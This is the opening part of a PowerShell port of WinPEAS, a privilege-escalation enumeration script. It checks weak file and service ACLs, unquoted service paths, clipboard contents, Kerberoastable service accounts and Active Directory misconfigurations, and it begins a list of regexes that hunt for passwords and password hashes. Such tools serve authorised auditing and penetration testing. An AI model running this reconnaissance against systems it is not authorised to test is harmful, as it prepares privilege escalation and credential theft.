<#
.SYNOPSIS
  PowerShell adaptation of WinPEAS.exe / WinPeas.bat
.DESCRIPTION
  For the legal enumeration of windows based computers that you either own or are approved to run this script on
.EXAMPLE
  # Default - normal operation with username/password audit in drives/registry
  .\winPeas.ps1

  # Include Excel files in search: .xls, .xlsx, .xlsm
  .\winPeas.ps1 -Excel

  # Full audit - normal operation with APIs / Keys / Tokens
  ## This will produce false positives ## 
  .\winPeas.ps1 -FullCheck 

  # Add Time stamps to each command
  .\winPeas.ps1 -TimeStamp

.NOTES
  Version:                    1.3
  PEASS-ng Original Author:   PEASS-ng
  winPEAS.ps1 Author:         @RandolphConley
  Creation Date:              10/4/2022
  Website:                    https://github.com/peass-ng/PEASS-ng

  TESTED: PoSh 5,7
  UNTESTED: PoSh 3,4
  NOT FULLY COMPATIBLE: PoSh 2 or lower
#>

######################## FUNCTIONS ########################

[CmdletBinding()]
param(
  [switch]$TimeStamp,
  [switch]$FullCheck,
  [switch]$Excel
)

# Gather KB from all patches installed
function returnHotFixID {
  param(
    [string]$title
  )
  # Match on KB or if patch does not have a KB, return end result
  if (($title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value) {
    return (($title | Select-String -AllMatches -Pattern 'KB(\d{4,6})').Matches.Value)
  }
  elseif (($title | Select-String -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value) {
    return (($title | Select-String -NotMatch -Pattern 'KB(\d{4,6})').Matches.Value)
  }
}

function Start-ACLCheck {
  param(
    $Target, $ServiceName)
  # Gather ACL of object
  if ($null -ne $target) {
    try {
      $ACLObject = Get-Acl $target -ErrorAction SilentlyContinue
    }
    catch { $null }
    
    # If Found, Evaluate Permissions
    if ($ACLObject) { 
      $Identity = @()
      $Identity += "$env:COMPUTERNAME\$env:USERNAME"
      if ($ACLObject.Owner -like $Identity ) { Write-Host "$Identity has ownership of $Target" -ForegroundColor Red }
      # This should now work for any language. Command runs whoami group, removes the first two line of output, converts from csv to object, but adds "group name" to the first column.
      whoami.exe /groups /fo csv | select-object -skip 2 | ConvertFrom-Csv -Header 'group name' | Select-Object -ExpandProperty 'group name' | ForEach-Object { $Identity += $_ }
      $IdentityFound = $false
      foreach ($i in $Identity) {
        $permission = $ACLObject.Access | Where-Object { $_.IdentityReference -like $i }
        $UserPermission = ""
        switch -WildCard ($Permission.FileSystemRights) {
          "FullControl" { 
            $userPermission = "FullControl"
            $IdentityFound = $true 
          }
          "Write*" { 
            $userPermission = "Write"
            $IdentityFound = $true 
          }
          "Modify" { 
            $userPermission = "Modify"
            $IdentityFound = $true 
          }
        }
        Switch ($permission.RegistryRights) {
          "FullControl" { 
            $userPermission = "FullControl"
            $IdentityFound = $true 
          }
        }
        if ($UserPermission) {
          if ($ServiceName) { Write-Host "$ServiceName found with permissions issue:" -ForegroundColor Red }
          Write-Host -ForegroundColor red "Identity $($permission.IdentityReference) has '$userPermission' perms for $Target"
        }
      }    
      # Identity Found Check - If False, loop through and stop at root of drive
      if ($IdentityFound -eq $false) {
        if ($Target.Length -gt 3) {
          $Target = Split-Path $Target
          Start-ACLCheck $Target -ServiceName $ServiceName
        }
      }
    }
    else {
      # If not found, split path one level and Check again
      $Target = Split-Path $Target
      Start-ACLCheck $Target $ServiceName
    }
  }
}

function UnquotedServicePathCheck {
  Write-Host "Fetching the list of services, this may take a while..."
  $services = Get-WmiObject -Class Win32_Service | 
    Where-Object { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" -and ($_.StartMode -eq "Auto" -or $_.StartMode -eq "Manual") -and ($_.State -eq "Running" -or $_.State -eq "Stopped") }
  if ($($services | Measure-Object).Count -lt 1) {
    Write-Host "No unquoted service paths were found"
  }
  else {
    $services | ForEach-Object {
      Write-Host "Unquoted Service Path found!" -ForegroundColor red
      Write-Host Name: $_.Name
      Write-Host PathName: $_.PathName
      Write-Host StartName: $_.StartName 
      Write-Host StartMode: $_.StartMode
      Write-Host Running: $_.State
    } 
  }
}

function TimeElapsed { 
  Write-Host "Time Running: $($stopwatch.Elapsed.Minutes):$($stopwatch.Elapsed.Seconds)" 
}

function Get-ClipBoardText {
  Add-Type -AssemblyName PresentationCore
  $text = [Windows.Clipboard]::GetText()
  if ($text) {
    Write-Host ""
    if ($TimeStamp) { TimeElapsed }
    Write-Host -ForegroundColor Blue "=========|| ClipBoard text found:"
    Write-Host $text
  }
}

function Get-DomainContext {
  try {
    return [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()
  }
  catch {
    return $null
  }
}

function Convert-SidToName {
  param(
    $SidInput
  )
  if ($null -eq $SidInput) { return $null }
  try {
    if ($SidInput -is [System.Security.Principal.SecurityIdentifier]) {
      $sidObject = $SidInput
    }
    else {
      $sidObject = New-Object System.Security.Principal.SecurityIdentifier($SidInput)
    }
    return $sidObject.Translate([System.Security.Principal.NTAccount]).Value
  }
  catch {
    try { return $sidObject.Value }
    catch { return [string]$SidInput }
  }
}

function Get-DnsZoneAceReviewSignal {
  param($Ace)
  if ([string]$Ace.AccessControlType -ne 'Allow') { return $null }
  $sid = [string]$Ace.IdentityReference.Value
  $principal = switch -Regex ($sid) {
    '^S-1-1-0$' { 'Everyone'; break }
    '^S-1-5-11$' { 'Authenticated Users'; break }
    '^S-1-5-21-([0-9]+-){3}513$' { 'Domain Users'; break }
    default { return $null }
  }
  $rights = [System.DirectoryServices.ActiveDirectoryRights]$Ace.ActiveDirectoryRights
  # GenericAll/GenericWrite are composite masks and include ordinary read rights.
  # Relevant write bits are covered below; do not flag an ACE just for sharing a read bit.
  $reviewRights = [System.DirectoryServices.ActiveDirectoryRights]::CreateChild -bor
    [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty -bor
    [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl -bor
    [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner
  if (($rights -band $reviewRights) -eq 0) { return $null }
  $scope = if ($Ace.ObjectType -ne [guid]::Empty) {
    'Object-specific; dnsNode or attribute scope unverified'
  } else { 'Review effective ACL' }
  return [pscustomobject]@{ Principal = "$principal ($sid)"; Rights = $rights.ToString(); Scope = $scope }
}

function Get-WeakDnsUpdateFindings {
  param([System.DirectoryServices.ActiveDirectory.Domain]$DomainContext)
  $report = [ordered]@{ Findings = @(); Inspected = 0; Unavailable = @(); Truncated = @() }
  $clock = [Diagnostics.Stopwatch]::StartNew()
  if (-not $DomainContext) {
    $report.Unavailable = @('AD domain context')
    return [pscustomobject]$report
  }
  try {
    $domainDN = 'DC=' + (($DomainContext.Name -split '\.') -join ',DC=')
    $forestDN = 'DC=' + (($DomainContext.Forest.RootDomain.Name -split '\.') -join ',DC=')
    if ($domainDN -eq 'DC=' -or $forestDN -eq 'DC=') { throw 'Domain name unavailable' }
  }
  catch {
    $report.Unavailable = @('DNS partition names')
    return [pscustomobject]$report
  }
  $partitions = @(
    [pscustomobject]@{ Name = 'DomainDnsZones'; Path = "LDAP://CN=MicrosoftDNS,DC=DomainDnsZones,$domainDN" },
    [pscustomobject]@{ Name = 'ForestDnsZones'; Path = "LDAP://CN=MicrosoftDNS,DC=ForestDnsZones,$forestDN" },
    [pscustomobject]@{ Name = 'Legacy domain'; Path = "LDAP://CN=MicrosoftDNS,$domainDN" }
  )
  $findings = New-Object System.Collections.Generic.List[object]
  foreach ($partition in $partitions) {
    $remaining = 8000 - $clock.ElapsedMilliseconds
    if ($remaining -le 0 -or $findings.Count -ge 40) {
      $report.Truncated += $partition.Name
      continue
    }
    $container = $null
    $searcher = $null
    $results = $null
    try {
      $container = New-Object System.DirectoryServices.DirectoryEntry($partition.Path)
      $searcher = New-Object System.DirectoryServices.DirectorySearcher($container)
      $searcher.Filter = '(objectClass=dnsZone)'
      $searcher.SearchScope = [System.DirectoryServices.SearchScope]::OneLevel
      $searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::None
      $searcher.PageSize = 0
      $searcher.SizeLimit = 51 # 50 zones plus one truncation sentinel; paging must stay disabled.
      $searcher.ClientTimeout = [TimeSpan]::FromMilliseconds([math]::Min(2000, $remaining))
      $searcher.ServerTimeLimit = $searcher.ClientTimeout
      $searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
      foreach ($property in @('name', 'nTSecurityDescriptor')) {
        [void]$searcher.PropertiesToLoad.Add($property)
      }
      $results = $searcher.FindAll()
      $seen = 0
      foreach ($result in $results) {
        if ($seen -ge 50 -or $clock.ElapsedMilliseconds -ge 8000 -or $findings.Count -ge 40) {
          $report.Truncated += $partition.Name
          break
        }
        $seen++
        $report.Inspected++
        try {
          if ($result.Properties['ntsecuritydescriptor'].Count -eq 0) { throw 'DACL unavailable' }
          $security = New-Object System.DirectoryServices.ActiveDirectorySecurity
          $security.SetSecurityDescriptorBinaryForm([byte[]]$result.Properties['ntsecuritydescriptor'][0])
          if ($result.Properties['name'].Count -eq 0) { throw 'Zone name unavailable' }
          $zone = [string]($result.Properties['name'] | Select-Object -First 1)
          $acesSeen = 0
          foreach ($ace in $security.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])) {
            if ($acesSeen -ge 256 -or $clock.ElapsedMilliseconds -ge 8000 -or $findings.Count -ge 40) {
              $report.Truncated += $partition.Name
              break
            }
            $acesSeen++
            $signal = Get-DnsZoneAceReviewSignal -Ace $ace
            if ($signal) {
              $findings.Add([pscustomobject]@{
                Zone = $zone; Partition = $partition.Name; Principal = $signal.Principal
                Rights = $signal.Rights; Scope = $signal.Scope
              })
            }
          }
        }
        catch { $report.Unavailable += "$($partition.Name) zone DACL" }
      }
    }
    catch { $report.Unavailable += $partition.Name }
    finally {
      if ($results) { $results.Dispose() }
      if ($searcher) { $searcher.Dispose() }
      if ($container) { $container.Dispose() }
    }
  }
  $report.Findings = @($findings.ToArray() | Sort-Object Zone, Partition, Principal, Rights, Scope -Unique)
  $report.Unavailable = @($report.Unavailable | Sort-Object -Unique)
  $report.Truncated = @($report.Truncated | Sort-Object -Unique)
  return [pscustomobject]$report
}

function Get-GmsaReadersReport {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  $report = [ordered]@{ State = 'Unknown'; Inspected = 0; Truncated = $false; Omitted = 0; Rows = @() }
  if (-not $DomainContext) { return [pscustomobject]$report }
  $domainEntry = $null
  $container = $null
  $searcher = $null
  $results = $null
  $rows = New-Object System.Collections.Generic.List[object]
  try {
    $domainEntry = $DomainContext.GetDirectoryEntry()
    $domainDN = [string]$domainEntry.distinguishedName
    if ([string]::IsNullOrEmpty($domainDN) -or $domainDN.Trim().Length -eq 0) { throw 'Domain DN unavailable' }
    $container = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = $container
    $searcher.Filter = "(&(objectClass=msDS-GroupManagedServiceAccount))"
    $searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::None
    $searcher.PageSize = 0 # SizeLimit applies to a single non-paged query.
    $searcher.SizeLimit = 121 # 120 inspected objects plus a truncation sentinel.
    $searcher.ClientTimeout = [TimeSpan]::FromSeconds(5)
    $searcher.ServerTimeLimit = [TimeSpan]::FromSeconds(5)
    [void]$searcher.PropertiesToLoad.Add("sAMAccountName")
    [void]$searcher.PropertiesToLoad.Add("msDS-GroupMSAMembership")
    $watch = [Diagnostics.Stopwatch]::StartNew()
    $results = $searcher.FindAll()
    foreach ($result in $results) {
      if ($watch.ElapsedMilliseconds -ge 8000 -or $report.Inspected -ge 120) {
        $report.Truncated = $true
        break
      }
      $report.Inspected++
      $name = $result.Properties["samaccountname"]
      $blobs = $result.Properties["msds-groupmsamembership"]
      if (-not $blobs) { continue }
      $principals = New-Object System.Collections.Generic.List[string]
      $weak = New-Object System.Collections.Generic.List[string]
      $blobsSeen = 0
      foreach ($blob in $blobs) {
        if ($blobsSeen -ge 2) { $report.Truncated = $true; break }
        $blobsSeen++
        if ($watch.ElapsedMilliseconds -ge 8000) { $report.Truncated = $true; break }
        try {
          if ($blob.Length -gt 16384) { $report.Truncated = $true; continue }
          $raw = New-Object System.Security.AccessControl.RawSecurityDescriptor (, $blob)
          if (-not $raw.DiscretionaryAcl) { continue }
          $acesSeen = 0
          foreach ($ace in $raw.DiscretionaryAcl) {
            if ($watch.ElapsedMilliseconds -ge 8000 -or $acesSeen -ge 128 -or $principals.Count -ge 16) {
              $report.Truncated = $true
              break
            }
            $acesSeen++
            if (-not $ace.SecurityIdentifier) { continue }
            $sid = [string]$ace.SecurityIdentifier.Value
            # Keep descriptor context without an unbounded network name-resolution call.
            # A deny trustee is not an allowed reader.
            $principal = "$sid [$($ace.AceQualifier)]"
            if ($principal) { $principals.Add([string]$principal) }
            if ([string]$ace.AceQualifier -eq 'AccessAllowed' -and
                ($sid -eq 'S-1-1-0' -or $sid -eq 'S-1-5-11' -or $sid -match '^S-1-5-21-(\d+-){3}513$')) {
              $weak.Add([string]$principal)
            }
          }
        }
        catch { $report.Truncated = $true }
      }
      if ($principals.Count -eq 0) { continue }
      $rows.Add([pscustomobject]@{
        Account        = [string]($name | Select-Object -First 1)
        Trustees       = (($principals | Sort-Object -Unique) -join ', ')
        WeakPrincipals = (($weak | Sort-Object -Unique) -join ', ')
      })
    }
    $report.State = if ($report.Truncated) { 'Partial' } else { 'Observed' }
  }
  catch {
    $report.State = if ($report.Inspected -gt 0) { 'Partial' } else { 'Unknown' }
    $report.Truncated = $true
  }
  finally {
    if ($results) { $results.Dispose() }
    if ($searcher) { $searcher.Dispose() }
    if ($container) { $container.Dispose() }
    if ($domainEntry) { $domainEntry.Dispose() }
  }
  $sorted = @($rows | Sort-Object @{Expression={ $_.WeakPrincipals -ne '' };Descending=$true}, Account)
  $report.Rows = @($sorted | Select-Object -First 20)
  $report.Omitted = $rows.Count - $report.Rows.Count
  return [pscustomobject]$report
}

function Get-PrivilegedSpnTargets {
  param([System.DirectoryServices.ActiveDirectory.Domain]$DomainContext)
  $report = [ordered]@{ State = 'Unknown'; Inspected = 0; Enabled = 0; UnknownEligibility = 0; Truncated = $false; Omitted = 0; Rows = @() }
  if (-not $DomainContext) { return [pscustomobject]$report }
  $results = $null
  $searcher = $null
  $domainEntry = $null
  $container = $null
  try {
    $domainEntry = $DomainContext.GetDirectoryEntry()
    $domainDN = $domainEntry.distinguishedName
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $container = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
    $searcher.SearchRoot = $container
    $searcher.Filter = '(&(objectClass=user)(servicePrincipalName=*))'
    $searcher.PageSize = 0
    $searcher.SizeLimit = 201
    $searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::None
    $searcher.ClientTimeout = [TimeSpan]::FromSeconds(5)
    $searcher.ServerTimeLimit = [TimeSpan]::FromSeconds(5)
    foreach ($property in @('sAMAccountName','servicePrincipalName','userAccountControl','msDS-SupportedEncryptionTypes','pwdLastSet','memberOf','objectClass')) {
      [void]$searcher.PropertiesToLoad.Add($property)
    }
    $watch = [Diagnostics.Stopwatch]::StartNew()
    $results = $searcher.FindAll()
    $rows = New-Object System.Collections.Generic.List[object]
    foreach ($res in $results) {
      if ($watch.Elapsed.TotalSeconds -ge 5) { $report.Truncated = $true; break }
      if ($report.Inspected -ge 200) { $report.Truncated = $true; break }
      $report.Inspected++
      $classes = @($res.Properties['objectclass'])
      if ($classes -contains 'computer' -or $classes -contains 'msDS-ManagedServiceAccount' -or $classes -contains 'msDS-GroupManagedServiceAccount') { continue }
      if ($res.Properties['useraccountcontrol'].Count -eq 0) { $report.UnknownEligibility++; continue }
      $uac = [int]$res.Properties['useraccountcontrol'][0]
      if (($uac -band 2) -ne 0) { continue }
      $report.Enabled++
      $flags = if ($res.Properties['msds-supportedencryptiontypes'].Count -gt 0) { [int]$res.Properties['msds-supportedencryptiontypes'][0] } else { 0 }
      $groups = @($res.Properties['memberof'] | ForEach-Object { ($_ -split ',')[0] -replace '^CN=','' })
      $keywords = @('Domain Admin','Enterprise Admin','Administrators','Exchange','IT_','Schema Admin','Account Operator','Server Operator','Backup Operator','DnsAdmin')
      $matched = @($groups | Where-Object { $group = $_; @($keywords | Where-Object { $group -like ('*' + $_ + '*') }).Count -gt 0 } | Sort-Object -Unique)
      $spns = @($res.Properties['serviceprincipalname'] | Sort-Object @{Expression={$_ -like 'MSSQLSvc/*'};Descending=$true}, @{Expression={$_}})
      $sql = @($spns | Where-Object { $_ -like 'MSSQLSvc/*' }).Count -gt 0
      $stale = $false
      if ($res.Properties['pwdlastset'].Count -gt 0) {
        try { $stale = [DateTime]::FromFileTimeUtc([long]$res.Properties['pwdlastset'][0]) -lt [DateTime]::UtcNow.AddDays(-365) } catch { }
      }
      $priority = if (($flags -band 4) -ne 0 -or $matched.Count -gt 0) { 2 } elseif (($uac -band 0x10000) -ne 0 -or $stale) { 1 } else { 0 }
      $rows.Add([pscustomobject]@{
        User = [string]($res.Properties['samaccountname'] | Select-Object -First 1)
        Priority = $priority
        Tier = @('Other service account','Review','Higher priority')[$priority]
        SPN = [string](($spns | Select-Object -First 2) -join ', ')
        SQL = $sql
        EncFlags = if ($flags -eq 0) { 'Unspecified' } else { ('0x{0:X}' -f $flags) }
        Groups = [string]($matched -join ', ')
      })
    }
    $report.State = 'Observed'
    $sorted = @($rows | Sort-Object @{Expression='SQL';Descending=$true}, @{Expression='Priority';Descending=$true}, User)
    $report.Rows = @($sorted | Select-Object -First 12)
    $report.Omitted = $report.Enabled - $report.Rows.Count
  }
  catch { $report.State = 'Unknown'; $report.Rows = @(); $report.Omitted = 0 }
  finally {
    if ($results) { $results.Dispose() }
    if ($searcher) { $searcher.Dispose() }
    if ($container) { $container.Dispose() }
    if ($domainEntry) { $domainEntry.Dispose() }
  }
  return [pscustomobject]$report
}

function Get-NtlmPolicySummary {
  try {
    $msv = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0' -ErrorAction Stop
  }
  catch { return $null }
  $lsa = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue
  return [pscustomobject]@{
    RestrictReceiving = $msv.RestrictReceivingNTLMTraffic
    RestrictSending   = $msv.RestrictSendingNTLMTraffic
    LmCompatibility   = if ($lsa) { $lsa.LmCompatibilityLevel } else { $null }
  }
}

function Get-LocalDcLdapPolicySummary {
  $result = [ordered]@{
    Role = 'Unknown'; Generation = 'Unknown'
    SigningState = 'Error'; SigningValue = $null
    BindingState = 'Error'; BindingValue = $null
  }
  try {
    $roleValue = (Get-CimInstance -ClassName Win32_ComputerSystem -Property DomainRole -ErrorAction Stop).DomainRole
    if ($null -eq $roleValue) { return [pscustomobject]$result }
    $role = [int]$roleValue
    if ($role -lt 0 -or $role -gt 5) { return [pscustomobject]$result }
    $result.Role = if ($role -ge 4 -and $role -le 5) { 'DomainController' } else { 'Member' }
  }
  catch { return [pscustomobject]$result }
  if ($result.Role -ne 'DomainController') { return [pscustomobject]$result }

  try {
    $build = [int](Get-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuild -ErrorAction Stop).CurrentBuild
    if ($build -ge 7600) { $result.Generation = if ($build -ge 26100) { 'Server2025OrLater' } else { 'Before2025' } }
  }
  catch { }

  try {
    $key = Get-Item -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -ErrorAction Stop
    foreach ($name in @('LDAPServerIntegrity', 'LdapEnforceChannelBinding')) {
      $prefix = if ($name -eq 'LDAPServerIntegrity') { 'Signing' } else { 'Binding' }
      try {
        if ($key.GetValueNames() -notcontains $name) { $result["${prefix}State"] = 'Missing'; continue }
        if ($key.GetValueKind($name) -ne [Microsoft.Win32.RegistryValueKind]::DWord) { continue }
        $raw = [int64]$key.GetValue($name)
        $result["${prefix}Value"] = [uint32]$(if ($raw -lt 0) { $raw + 4294967296 } else { $raw })
        $result["${prefix}State"] = 'Present'
      }
      catch { }
    }
  }
  catch {
    if ($_.CategoryInfo.Category -eq [System.Management.Automation.ErrorCategory]::ObjectNotFound) {
      $result.SigningState = 'Missing'; $result.BindingState = 'Missing'
    }
  }
  return [pscustomobject]$result
}

function Get-DomainMachineAccountQuota {
  param([System.DirectoryServices.ActiveDirectory.Domain]$DomainContext)
  try {
    $entry = $DomainContext.GetDirectoryEntry()
    try {
      $entry.RefreshCache(@('ms-DS-MachineAccountQuota'))
      $value = $entry.Properties['ms-DS-MachineAccountQuota'].Value
      if ($null -eq $value) { return [pscustomobject]@{ State = 'Missing'; Value = $null } }
      $quota = [int]$value
      if ($quota -lt 0) { return [pscustomobject]@{ State = 'Invalid'; Value = $null } }
      return [pscustomobject]@{ State = 'Present'; Value = $quota }
    }
    finally { $entry.Dispose() }
  }
  catch { return [pscustomobject]@{ State = 'Error'; Value = $null } }
}

function Get-TimeSkewInfo {
  param(
    [System.DirectoryServices.ActiveDirectory.Domain]$DomainContext
  )
  if (-not $DomainContext) { return $null }
  try {
    $pdc = $DomainContext.PdcRoleOwner.Name
  }
  catch { return $null }
  try {
    $stripchart = w32tm /stripchart /computer:$pdc /dataonly /samples:3 2>$null
    $sample = $stripchart | Where-Object { $_ -match ',' } | Select-Object -Last 1
    if (-not $sample) { return $null }
    $parts = $sample.Split(',')
    if ($parts.Count -lt 2) { return $null }
    $offsetString = $parts[1].Trim().TrimEnd('s')
    [double]$offsetSeconds = 0
    if (-not [double]::TryParse($offsetString, [ref]$offsetSeconds)) { return $null }
    return [pscustomobject]@{
      Source        = $pdc
      OffsetSeconds = $offsetSeconds
      RawSample     = $sample
    }
  }
  catch {
    return $null
  }
}

function Get-AdcsSchannelInfo {
  $info = [ordered]@{
    MappingValue = $null
    UpnMapping   = $false
    ServiceState = $null
  }
  try {
    $schannel = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' -Name 'CertificateMappingMethods' -ErrorAction Stop
    $info.MappingValue = $schannel.CertificateMappingMethods
    if (($schannel.CertificateMappingMethods -band 0x4) -eq 0x4) { $info.UpnMapping = $true }
  }
  catch { }
  $svc = Get-Service -Name certsrv -ErrorAction SilentlyContinue
  if ($svc) { $info.ServiceState = $svc.Status }
  return [pscustomobject]$info
}


function Search-Excel {
  [cmdletbinding()]
  Param (
      [parameter(Mandatory, ValueFromPipeline)]
      [ValidateScript({
          Try {
              If (Test-Path -Path $_) {$True}
              Else {Throw "$($_) is not a valid path!"}
          }
          Catch {
              Throw $_
          }
      })]
      [string]$Source,
      [parameter(Mandatory)]
      [string]$SearchText
      #You can specify wildcard characters (*, ?)
  )
  $Excel = New-Object -ComObject Excel.Application
  Try {
      $Source = Convert-Path $Source
  }
  Catch {
      Write-Warning "Unable locate full path of $($Source)"
      BREAK
  }
  $Workbook = $Excel.Workbooks.Open($Source)
  ForEach ($Worksheet in @($Workbook.Sheets)) {
      # Find Method https://msdn.microsoft.com/en-us/vba/excel-vba/articles/range-find-method-excel
      $Found = $WorkSheet.Cells.Find($SearchText)
      If ($Found) {
        try{  
          # Address Method https://msdn.microsoft.com/en-us/vba/excel-vba/articles/range-address-property-excel
          Write-Host "Pattern: '$SearchText' found in $source" -ForegroundColor Blue
          $BeginAddress = $Found.Address(0,0,1,1)
          #Initial Found Cell
          New-Object -TypeName PSObject -Property ([Ordered]@{
              WorkSheet = $Worksheet.Name
              Column = $Found.Column
              Row =$Found.Row
              TextMatch = $Found.Text
              Address = $BeginAddress
          })
          Do {
              $Found = $WorkSheet.Cells.FindNext($Found)
              $Address = $Found.Address(0,0,1,1)
              If ($Address -eq $BeginAddress) {
                Write-host "Address is same as Begin Address"
                  BREAK
              }
              New-Object -TypeName PSObject -Property ([Ordered]@{
                  WorkSheet = $Worksheet.Name
                  Column = $Found.Column
                  Row =$Found.Row
                  TextMatch = $Found.Text
                  Address = $Address
              })                
          } Until ($False)
        }
        catch {
          # Null expression in Found
        }
      }
      #Else {
      #    Write-Warning "[$($WorkSheet.Name)] Nothing Found!"
      #}
  }
  try{
  $workbook.close($False)
  [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$excel)
  [gc]::Collect()
  [gc]::WaitForPendingFinalizers()
  }
  catch{
    #Usually an RPC error
  }
  Remove-Variable excel -ErrorAction SilentlyContinue
}

#Get-CIMInstace/Get-WMIObject 'Win32_Product' calls kick off silent repairs on some programs causing potential issues after/while running this & doesn't always return a complete list.
#Allegedly 'Win32reg_AddRemovePrograms' works fine now but this method ensures safety of target systems.
function Get-InstalledApplications {
[cmdletbinding()]
param(
  [Parameter(DontShow)]
  $keys = @('','\Wow6432Node')
)
  foreach($key in $keys) {
      try {
        $apps = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',$env:COMPUTERNAME).OpenSubKey("SOFTWARE$key\Microsoft\Windows\CurrentVersion\Uninstall").GetSubKeyNames()
      }
      catch { 
        Continue 
      }
    foreach($app in $apps) {
        $program = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',$env:COMPUTERNAME).OpenSubKey("SOFTWARE$key\Microsoft\Windows\CurrentVersion\Uninstall\$app")
        $name = $program.GetValue('DisplayName')
      if($name) {
        New-Object -TypeName PSObject -Property ([Ordered]@{       
              Computername = $env:COMPUTERNAME
              Software = $name 
              Version = $program.GetValue("DisplayVersion")
              Publisher = $program.GetValue("Publisher")
              InstallDate = $program.GetValue("InstallDate")
              UninstallString = $program.GetValue("UninstallString")
              Architecture = $(if($key -eq '\wow6432node') {'x86'}else{'x64'})
              Path = $program.Name
        })
      }
    }
  }
}

function Write-Color([String[]]$Text, [ConsoleColor[]]$Color) {
  for ($i = 0; $i -lt $Text.Length; $i++) {
    Write-Host $Text[$i] -Foreground $Color[$i] -NoNewline
  }
  Write-Host
}


#Write-Color "    ((,.,/((((((((((((((((((((/,  */" -Color Green
Write-Color ",/*,..*(((((((((((((((((((((((((((((((((," -Color Green
Write-Color ",*/((((((((((((((((((/,  .*//((//**, .*((((((*" -Color Green
Write-Color "((((((((((((((((", "* *****,,,", "\########## .(* ,((((((" -Color Green, Blue, Green
Write-Color "(((((((((((", "/*******************", "####### .(. ((((((" -Color Green, Blue, Green
Write-Color "(((((((", "/******************", "/@@@@@/", "***", "\#######\((((((" -Color Green, Blue, White, Blue, Green
Write-Color ",,..", "**********************", "/@@@@@@@@@/", "***", ",#####.\/(((((" -Color Green, Blue, White, Blue, Green
Write-Color ", ,", "**********************", "/@@@@@+@@@/", "*********", "##((/ /((((" -Color Green, Blue, White, Blue, Green
Write-Color "..(((##########", "*********", "/#@@@@@@@@@/", "*************", ",,..((((" -Color Green, Blue, White, Blue, Green
Write-Color ".(((################(/", "******", "/@@@@@/", "****************", ".. /((" -Color Green, Blue, White, Blue, Green
Write-Color ".((########################(/", "************************", "..*(" -Color Green, Blue, Green
Write-Color ".((#############################(/", "********************", ".,(" -Color Green, Blue, Green
Write-Color ".((##################################(/", "***************", "..(" -Color Green, Blue, Green
Write-Color ".((######################################(/", "***********", "..(" -Color Green, Blue, Green
Write-Color ".((######", "(,.***.,(", "###################", "(..***", "(/*********", "..(" -Color Green, Green, Green, Green, Blue, Green
Write-Color ".((######*", "(####((", "###################", "((######", "/(********", "..(" -Color Green, Green, Green, Green, Blue, Green
Write-Color ".((##################", "(/**********(", "################(**...(" -Color Green, Green, Green
Write-Color ".(((####################", "/*******(", "###################.((((" -Color Green, Green, Green
Write-Color ".(((((############################################/  /((" -Color Green
Write-Color "..(((((#########################################(..(((((." -Color Green
Write-Color "....(((((#####################################( .((((((." -Color Green
Write-Color "......(((((#################################( .(((((((." -Color Green
Write-Color "(((((((((. ,(############################(../(((((((((." -Color Green
Write-Color "  (((((((((/,  ,####################(/..((((((((((." -Color Green
Write-Color "        (((((((((/,.  ,*//////*,. ./(((((((((((." -Color Green
Write-Color "           (((((((((((((((((((((((((((/" -Color Green
Write-Color "          by PEASS-ng & RandolphConley" -Color Green

######################## VARIABLES ########################

# Manually added Regex search strings from https://github.com/peass-ng/PEASS-ng/blob/master/build_lists/sensitive_files.yaml

# Set these values to true to add them to the regex search by default
$password = $true
$username = $true
$webAuth = $true

$regexSearch = @{}

if ($password) {
  $regexSearch.add("Simple Passwords1", "pass.*[=:].+")
  $regexSearch.add("Simple Passwords2", "pwd.*[=:].+")
  $regexSearch.add("Apr1 MD5", '\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}')
  $regexSearch.add("Apache SHA", "\{SHA\}[0-9a-zA-Z/_=]{10,}")
  $regexSearch.add("Blowfish", '\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*')
  $regexSearch.add("Drupal", '\$S\$[a-zA-Z0-9_/\.]{52}')
  $regexSearch.add("Joomlavbulletin", "[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}")
  $regexSearch.add("Linux MD5", '\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}')
  $regexSearch.add("phpbb3", '\$H\$[a-zA-Z0-9_/\.]{31}')
  $regexSearch.add("sha512crypt", '\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}')
  $regexSearch.add("Wordpress", '\$P\$[a-zA-Z0-9_/\.]{31}')
  $regexSearch.add("md5", "(^|[^a-zA-Z0-9])[a-fA-F0-9]{32}([^a-zA-Z0-9]|$)")
  $regexSearch.add("sha1", "(^|[^a-zA-Z0-9])[a-fA-F0-9]{40}([^a-zA-Z0-9]|$)")
